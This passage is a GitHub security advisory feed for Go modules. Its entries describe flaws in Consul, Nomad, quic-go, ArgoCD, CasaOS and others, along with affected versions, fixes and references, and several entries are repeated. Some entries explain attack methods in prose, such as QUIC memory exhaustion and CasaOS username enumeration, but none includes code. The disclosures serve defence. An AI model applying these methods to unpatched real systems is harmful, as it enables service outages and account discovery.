<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-04-03T11:01:05.159Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/consul] HashiCorp Consul does not properly validate node or segment names prior to usage in JWT claim assertions]]></title>
        <id>https://github.com/advisories/GHSA-hr3v-8cp3-68rf</id>
        <link href="https://github.com/advisories/GHSA-hr3v-8cp3-68rf"/>
        <updated>2024-04-02T20:30:13.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Consul 1.8.1 up to 1.11.8, 1.12.4, and 1.13.1 did not properly validate the node or segment names prior to interpolation and usage in JWT claim assertions with the auto config RPC. Fixed in 1.11.9, 1.12.5, and 1.13.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41803">https://nvd.nist.gov/vuln/detail/CVE-2021-41803</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-19-consul-auto-config-jwt-authorization-missing-input-validation/44627">https://discuss.hashicorp.com/t/hcsec-2022-19-consul-auto-config-jwt-authorization-missing-input-validation/44627</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI</a></li>
<li><a href="https://github.com/advisories/GHSA-hr3v-8cp3-68rf">https://github.com/advisories/GHSA-hr3v-8cp3-68rf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hr3v-8cp3-68rf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-09-25T00:00:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/consul] HashiCorp Consul does not properly validate node or segment names prior to usage in JWT claim assertions]]></title>
        <id>https://github.com/advisories/GHSA-hr3v-8cp3-68rf</id>
        <link href="https://github.com/advisories/GHSA-hr3v-8cp3-68rf"/>
        <updated>2024-04-02T20:30:13.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Consul 1.8.1 up to 1.11.8, 1.12.4, and 1.13.1 did not properly validate the node or segment names prior to interpolation and usage in JWT claim assertions with the auto config RPC. Fixed in 1.11.9, 1.12.5, and 1.13.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41803">https://nvd.nist.gov/vuln/detail/CVE-2021-41803</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-19-consul-auto-config-jwt-authorization-missing-input-validation/44627">https://discuss.hashicorp.com/t/hcsec-2022-19-consul-auto-config-jwt-authorization-missing-input-validation/44627</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI</a></li>
<li><a href="https://github.com/advisories/GHSA-hr3v-8cp3-68rf">https://github.com/advisories/GHSA-hr3v-8cp3-68rf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hr3v-8cp3-68rf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-09-25T00:00:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/consul] HashiCorp Consul does not properly validate node or segment names prior to usage in JWT claim assertions]]></title>
        <id>https://github.com/advisories/GHSA-hr3v-8cp3-68rf</id>
        <link href="https://github.com/advisories/GHSA-hr3v-8cp3-68rf"/>
        <updated>2024-04-02T20:30:13.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Consul 1.8.1 up to 1.11.8, 1.12.4, and 1.13.1 did not properly validate the node or segment names prior to interpolation and usage in JWT claim assertions with the auto config RPC. Fixed in 1.11.9, 1.12.5, and 1.13.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41803">https://nvd.nist.gov/vuln/detail/CVE-2021-41803</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-19-consul-auto-config-jwt-authorization-missing-input-validation/44627">https://discuss.hashicorp.com/t/hcsec-2022-19-consul-auto-config-jwt-authorization-missing-input-validation/44627</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XNF4OLYZRQE75EB5TW5N42FSXHBXGWFE</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI</a></li>
<li><a href="https://github.com/advisories/GHSA-hr3v-8cp3-68rf">https://github.com/advisories/GHSA-hr3v-8cp3-68rf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hr3v-8cp3-68rf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-09-25T00:00:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/temporalio/ui-server/v2] Temporal UI Server cross-site scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8f25-w7qj-r7hc</id>
        <link href="https://github.com/advisories/GHSA-8f25-w7qj-r7hc"/>
        <updated>2024-04-02T18:53:38.000Z</updated>
        <content type="html"><![CDATA[<p>For an attacker with pre-existing access to send a signal to a workflow, the attacker can make the signal name a script that executes when a victim views that signal. The XSS is in the timeline page displaying the workflow execution details of the workflow that was sent the crafted signal.
Access to send a signal to a workflow is determined by how you configured the authorizer on your server. This includes any entity with permission to directly call SignalWorkflowExecution or SignalWithStartWorkflowExecution, or any entity can deploy a worker that has access to call workflow progress APIs (specifically RespondWorkflowTaskCompleted).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2435">https://nvd.nist.gov/vuln/detail/CVE-2024-2435</a></li>
<li><a href="https://github.com/temporalio/ui-server/releases/tag/v2.25.0">https://github.com/temporalio/ui-server/releases/tag/v2.25.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8f25-w7qj-r7hc">https://github.com/advisories/GHSA-8f25-w7qj-r7hc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8f25-w7qj-r7hc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-02T18:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ca17/teamsacs] CA17 TeamsACS Cross Site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hwvw-gh23-qpvq</id>
        <link href="https://github.com/advisories/GHSA-hwvw-gh23-qpvq"/>
        <updated>2024-04-02T18:47:25.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in CA17 TeamsACS v.1.0.1 allows a remote attacker to execute arbitrary code via a crafted script to the errmsg parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22780">https://nvd.nist.gov/vuln/detail/CVE-2024-22780</a></li>
<li><a href="https://fuo.fi/CVE-2024-22780">https://fuo.fi/CVE-2024-22780</a></li>
<li><a href="https://github.com/CA17/TeamsACS">https://github.com/CA17/TeamsACS</a></li>
<li><a href="http://ca17.com">http://ca17.com</a></li>
<li><a href="https://github.com/CA17/TeamsACS/issues/26">https://github.com/CA17/TeamsACS/issues/26</a></li>
<li><a href="https://github.com/advisories/GHSA-hwvw-gh23-qpvq">https://github.com/advisories/GHSA-hwvw-gh23-qpvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwvw-gh23-qpvq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-02T15:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/quic-go/quic-go] QUIC's Connection ID Mechanism vulnerable to Memory Exhaustion Attack]]></title>
        <id>https://github.com/advisories/GHSA-c33x-xqrf-c478</id>
        <link href="https://github.com/advisories/GHSA-c33x-xqrf-c478"/>
        <updated>2024-04-02T14:16:07.000Z</updated>
        <content type="html"><![CDATA[<p>An attacker can cause its peer to run out of memory sending a large number of NEW_CONNECTION_ID frames that retire old connection IDs. The receiver is supposed to respond to each retirement frame with a RETIRE_CONNECTION_ID frame. The attacker can prevent the receiver from sending out (the vast majority of) these RETIRE_CONNECTION_ID frames by collapsing the peers congestion window (by selectively acknowledging received packets) and by manipulating the peer's RTT estimate.</p>
<p>I published a more detailed description of the attack and its mitigation in this blog post: <a href="https://seemann.io/posts/2024-03-19-exploiting-quics-connection-id-management/">https://seemann.io/posts/2024-03-19-exploiting-quics-connection-id-management/</a>.
I also presented this attack in the IETF QUIC working group session at IETF 119: <a href="https://youtu.be/JqXtYcZAtIA?si=nJ31QKLBSTRXY35U&amp;t=3683">https://youtu.be/JqXtYcZAtIA?si=nJ31QKLBSTRXY35U&amp;t=3683</a></p>
<p>There's no way to mitigate this attack, please update quic-go to a version that contains the fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/quic-go/quic-go/security/advisories/GHSA-c33x-xqrf-c478">https://github.com/quic-go/quic-go/security/advisories/GHSA-c33x-xqrf-c478</a></li>
<li><a href="https://github.com/quic-go/quic-go/commit/4a99b816ae3ab03ae5449d15aac45147c85ed47a">https://github.com/quic-go/quic-go/commit/4a99b816ae3ab03ae5449d15aac45147c85ed47a</a></li>
<li><a href="https://seemann.io/posts/2024-03-19-exploiting-quics-connection-id-management">https://seemann.io/posts/2024-03-19-exploiting-quics-connection-id-management</a></li>
<li><a href="https://www.youtube.com/watch?v=JqXtYcZAtIA&amp;t=3683s">https://www.youtube.com/watch?v=JqXtYcZAtIA&amp;t=3683s</a></li>
<li><a href="https://github.com/advisories/GHSA-c33x-xqrf-c478">https://github.com/advisories/GHSA-c33x-xqrf-c478</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c33x-xqrf-c478</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-02T14:16:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad Search API Leaks Information About CSI Plugins]]></title>
        <id>https://github.com/advisories/GHSA-v5fm-hr72-27hx</id>
        <link href="https://github.com/advisories/GHSA-v5fm-hr72-27hx"/>
        <updated>2024-04-01T19:17:39.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad such that the search HTTP API can reveal names of available CSI plugins to unauthenticated users or users without the plugin:read policy. This vulnerability, CVE-2023-3300, affects Nomad since 0.11 and was fixed in 1.6.0, 1.5.7, and 1.4.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3300">https://nvd.nist.gov/vuln/detail/CVE-2023-3300</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-22-nomad-search-api-leaks-information-about-csi-plugins/56272">https://discuss.hashicorp.com/t/hcsec-2023-22-nomad-search-api-leaks-information-about-csi-plugins/56272</a></li>
<li><a href="https://github.com/hashicorp/nomad/commit/a8789d3872bbf1b1f420f28b0f7ad8532a41d5e3">https://github.com/hashicorp/nomad/commit/a8789d3872bbf1b1f420f28b0f7ad8532a41d5e3</a></li>
<li><a href="https://github.com/advisories/GHSA-v5fm-hr72-27hx">https://github.com/advisories/GHSA-v5fm-hr72-27hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5fm-hr72-27hx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-20T00:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad Search API Leaks Information About CSI Plugins]]></title>
        <id>https://github.com/advisories/GHSA-v5fm-hr72-27hx</id>
        <link href="https://github.com/advisories/GHSA-v5fm-hr72-27hx"/>
        <updated>2024-04-01T19:17:39.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad such that the search HTTP API can reveal names of available CSI plugins to unauthenticated users or users without the plugin:read policy. This vulnerability, CVE-2023-3300, affects Nomad since 0.11 and was fixed in 1.6.0, 1.5.7, and 1.4.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3300">https://nvd.nist.gov/vuln/detail/CVE-2023-3300</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-22-nomad-search-api-leaks-information-about-csi-plugins/56272">https://discuss.hashicorp.com/t/hcsec-2023-22-nomad-search-api-leaks-information-about-csi-plugins/56272</a></li>
<li><a href="https://github.com/hashicorp/nomad/commit/a8789d3872bbf1b1f420f28b0f7ad8532a41d5e3">https://github.com/hashicorp/nomad/commit/a8789d3872bbf1b1f420f28b0f7ad8532a41d5e3</a></li>
<li><a href="https://github.com/advisories/GHSA-v5fm-hr72-27hx">https://github.com/advisories/GHSA-v5fm-hr72-27hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5fm-hr72-27hx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-20T00:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad ACL Policies without Label are Applied to Unexpected Resources]]></title>
        <id>https://github.com/advisories/GHSA-rpvr-38xv-xvxq</id>
        <link href="https://github.com/advisories/GHSA-rpvr-38xv-xvxq"/>
        <updated>2024-04-01T18:34:07.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad, an ACL policy using a block without label may be applied to unexpected resources. This vulnerability, CVE-2023-3072, affects Nomad from 0.7 up to 1.5.6 and 1.4.10 and was fixed in 1.6.0, 1.5.7, and 1.4.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3072">https://nvd.nist.gov/vuln/detail/CVE-2023-3072</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-20-nomad-acl-policies-without-label-are-applied-to-unexpected-resources/56270">https://discuss.hashicorp.com/t/hcsec-2023-20-nomad-acl-policies-without-label-are-applied-to-unexpected-resources/56270</a></li>
<li><a href="https://github.com/advisories/GHSA-rpvr-38xv-xvxq">https://github.com/advisories/GHSA-rpvr-38xv-xvxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rpvr-38xv-xvxq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-20T00:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad ACL Policies without Label are Applied to Unexpected Resources]]></title>
        <id>https://github.com/advisories/GHSA-rpvr-38xv-xvxq</id>
        <link href="https://github.com/advisories/GHSA-rpvr-38xv-xvxq"/>
        <updated>2024-04-01T18:34:07.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad, an ACL policy using a block without label may be applied to unexpected resources. This vulnerability, CVE-2023-3072, affects Nomad from 0.7 up to 1.5.6 and 1.4.10 and was fixed in 1.6.0, 1.5.7, and 1.4.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3072">https://nvd.nist.gov/vuln/detail/CVE-2023-3072</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-20-nomad-acl-policies-without-label-are-applied-to-unexpected-resources/56270">https://discuss.hashicorp.com/t/hcsec-2023-20-nomad-acl-policies-without-label-are-applied-to-unexpected-resources/56270</a></li>
<li><a href="https://github.com/advisories/GHSA-rpvr-38xv-xvxq">https://github.com/advisories/GHSA-rpvr-38xv-xvxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rpvr-38xv-xvxq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-20T00:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad Caller ACL Token’s Secret ID is Exposed to Sentinel]]></title>
        <id>https://github.com/advisories/GHSA-9jfx-84v9-2rr2</id>
        <link href="https://github.com/advisories/GHSA-9jfx-84v9-2rr2"/>
        <updated>2024-04-01T18:31:00.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad such that the API caller’s ACL token secret ID is exposed to Sentinel policies. This vulnerability, CVE-2023-3299, affects Nomad from 1.2.11 up to 1.5.6, and 1.4.10 and was fixed in 1.6.0, 1.5.7, and 1.4.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3299">https://nvd.nist.gov/vuln/detail/CVE-2023-3299</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-21-nomad-caller-acl-tokens-secret-id-is-exposed-to-sentinel/56271">https://discuss.hashicorp.com/t/hcsec-2023-21-nomad-caller-acl-tokens-secret-id-is-exposed-to-sentinel/56271</a></li>
<li><a href="https://github.com/hashicorp/nomad/issues/17907">https://github.com/hashicorp/nomad/issues/17907</a></li>
<li><a href="https://github.com/advisories/GHSA-9jfx-84v9-2rr2">https://github.com/advisories/GHSA-9jfx-84v9-2rr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jfx-84v9-2rr2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-07-20T00:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Nomad Caller ACL Token’s Secret ID is Exposed to Sentinel]]></title>
        <id>https://github.com/advisories/GHSA-9jfx-84v9-2rr2</id>
        <link href="https://github.com/advisories/GHSA-9jfx-84v9-2rr2"/>
        <updated>2024-04-01T18:31:00.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad such that the API caller’s ACL token secret ID is exposed to Sentinel policies. This vulnerability, CVE-2023-3299, affects Nomad from 1.2.11 up to 1.5.6, and 1.4.10 and was fixed in 1.6.0, 1.5.7, and 1.4.11.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3299">https://nvd.nist.gov/vuln/detail/CVE-2023-3299</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-21-nomad-caller-acl-tokens-secret-id-is-exposed-to-sentinel/56271">https://discuss.hashicorp.com/t/hcsec-2023-21-nomad-caller-acl-tokens-secret-id-is-exposed-to-sentinel/56271</a></li>
<li><a href="https://github.com/hashicorp/nomad/issues/17907">https://github.com/hashicorp/nomad/issues/17907</a></li>
<li><a href="https://github.com/advisories/GHSA-9jfx-84v9-2rr2">https://github.com/advisories/GHSA-9jfx-84v9-2rr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jfx-84v9-2rr2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-07-20T00:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/IceWhaleTech/CasaOS-UserService] CasaOS Username Enumeration - Bypass of CVE-2024-24766]]></title>
        <id>https://github.com/advisories/GHSA-hcw2-2r9c-gc6p</id>
        <link href="https://github.com/advisories/GHSA-hcw2-2r9c-gc6p"/>
        <updated>2024-04-01T20:11:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Casa OS Login page has disclosed the username enumeration vulnerability in the login page which was patched in <code>CasaOS  v0.4.7</code>.</p>
<h3 id="details">Details</h3>
<p>It is observed that the attacker can enumerate the CasaOS username using the application response. If the username is incorrect the application gives the error "<strong>User does not exist</strong>" with success code "<strong>10006</strong>", If the password is incorrect the application gives the error "<strong>User does not exist or password is invalid</strong>" with success code "<strong>10013</strong>".</p>
<h3 id="poc">PoC</h3>
<ol>
<li>If the Username is invalid application gives "User does not exist" with success code "<strong>10006</strong>".</li>
</ol>
<p><img alt="1" src="https://github.com/IceWhaleTech/CasaOS-UserService/assets/63414468/a6eb4321-b2f3-4fba-aa8e-e1d0fbf58187"></p>
<ol start="2">
<li>If the Password is invalid application gives  "<strong>User does not exist or password is invalid</strong>" with success code "<strong>10013</strong>".</li>
</ol>
<p><img alt="2" src="https://github.com/IceWhaleTech/CasaOS-UserService/assets/63414468/126eff54-eeb0-4ee6-bc46-695376b5e5cd"></p>
<h3 id="impact">Impact</h3>
<p>Using this error attacker can enumerate the username of CasaOS.</p>
<h3 id="the-logic-behind-the-issue">The logic behind the issue</h3>
<p>The logic behind the issue
If the username is incorrect, then throw an error  "<strong>User does not exist</strong>" with success code "<strong>10006</strong>", else throw an error "<strong>User does not exist or password is invalid</strong>" with success code "<strong>10013</strong>".</p>
<p>This condition can be vice versa like:</p>
<p>If the password is incorrect, then throw an error "<strong>User does not exist or password is invalid</strong>" with success code "<strong>10013</strong>", else throw an error  "<strong>User does not exist</strong>" with success code "<strong>10006</strong>".</p>
<h3 id="mitigation">Mitigation</h3>
<p>Since this is the condition we have to implement a single error which can be "<strong>Username/Password is Incorrect!!!</strong>" with single success code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/IceWhaleTech/CasaOS-UserService/security/advisories/GHSA-hcw2-2r9c-gc6p">https://github.com/IceWhaleTech/CasaOS-UserService/security/advisories/GHSA-hcw2-2r9c-gc6p</a></li>
<li><a href="https://github.com/IceWhaleTech/CasaOS-UserService/commit/dd927fe1c805e53790f73cfe10c7a4ded3bc5bdb">https://github.com/IceWhaleTech/CasaOS-UserService/commit/dd927fe1c805e53790f73cfe10c7a4ded3bc5bdb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28232">https://nvd.nist.gov/vuln/detail/CVE-2024-28232</a></li>
<li><a href="https://github.com/advisories/GHSA-hcw2-2r9c-gc6p">https://github.com/advisories/GHSA-hcw2-2r9c-gc6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcw2-2r9c-gc6p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-01T15:48:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] ArgoCD's repo server has Uncontrolled Resource Consumption vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jhwx-mhww-rgc3</id>
        <link href="https://github.com/advisories/GHSA-jhwx-mhww-rgc3"/>
        <updated>2024-03-29T19:04:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All versions of ArgoCD starting from v2.4 have a bug where the ArgoCD repo-server component is vulnerable to a Denial-of-Service attack vector. Specifically,  it's possible to crash the repo server component through an out of memory error by pointing it to a malicious Helm registry.
The loadRepoIndex() function in the ArgoCD's helm package, does not limit the size nor time while fetching the data. It fetches it and creates a byte slice from the retrieved data in one go. If the registry is implemented to push data continuously, the repo server will keep allocating memory until it runs out of it.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.10.5
v2.9.10
v2.8.14</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jhwx-mhww-rgc3">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jhwx-mhww-rgc3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29893">https://nvd.nist.gov/vuln/detail/CVE-2024-29893</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/14f681e3ee7c38731943b98f92277e88a3db109d">https://github.com/argoproj/argo-cd/commit/14f681e3ee7c38731943b98f92277e88a3db109d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/36b8a12a38f8d92d55bffc81deed44389bf6eb59">https://github.com/argoproj/argo-cd/commit/36b8a12a38f8d92d55bffc81deed44389bf6eb59</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/3e5a878f6e30d935fa149723ea2a2e93748fcddd">https://github.com/argoproj/argo-cd/commit/3e5a878f6e30d935fa149723ea2a2e93748fcddd</a></li>
<li><a href="https://github.com/advisories/GHSA-jhwx-mhww-rgc3">https://github.com/advisories/GHSA-jhwx-mhww-rgc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhwx-mhww-rgc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-29T19:04:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] ArgoCD's repo server has Uncontrolled Resource Consumption vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jhwx-mhww-rgc3</id>
        <link href="https://github.com/advisories/GHSA-jhwx-mhww-rgc3"/>
        <updated>2024-03-29T19:04:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All versions of ArgoCD starting from v2.4 have a bug where the ArgoCD repo-server component is vulnerable to a Denial-of-Service attack vector. Specifically,  it's possible to crash the repo server component through an out of memory error by pointing it to a malicious Helm registry.
The loadRepoIndex() function in the ArgoCD's helm package, does not limit the size nor time while fetching the data. It fetches it and creates a byte slice from the retrieved data in one go. If the registry is implemented to push data continuously, the repo server will keep allocating memory until it runs out of it.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.10.5
v2.9.10
v2.8.14</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
